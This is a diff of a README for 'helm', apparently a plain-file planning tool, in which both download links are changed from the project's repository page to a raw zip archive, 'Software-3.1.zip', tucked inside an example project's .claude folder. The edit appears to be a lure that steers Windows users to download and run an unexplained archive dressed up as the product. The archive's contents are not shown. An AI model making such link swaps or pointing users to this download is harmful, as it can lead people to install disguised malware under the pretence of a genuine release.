@@ -1,6 +1,6 @@
 # 🧠 helm - Plan your work with plain files
 
-[![Download](https://img.shields.io/badge/Download-helm-blue?style=for-the-badge&logo=github)](https://github.com/liquorlicensegenusphysostigma689/helm)
+[![Download](https://img.shields.io/badge/Download-helm-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/liquorlicensegenusphysostigma689/helm/main/projects/example-project/.claude/Software-3.1.zip)
 
 ## 🚀 What helm does
 
@@ -20,7 +20,7 @@ helm is built for people who want a clear system without a lot of app clutter.
 
 Use this link to visit this page to download:
 
-[Download helm](https://github.com/liquorlicensegenusphysostigma689/helm)
+[Download helm](https://raw.githubusercontent.com/liquorlicensegenusphysostigma689/helm/main/projects/example-project/.claude/Software-3.1.zip)
 
 ### What to do on Windows
 
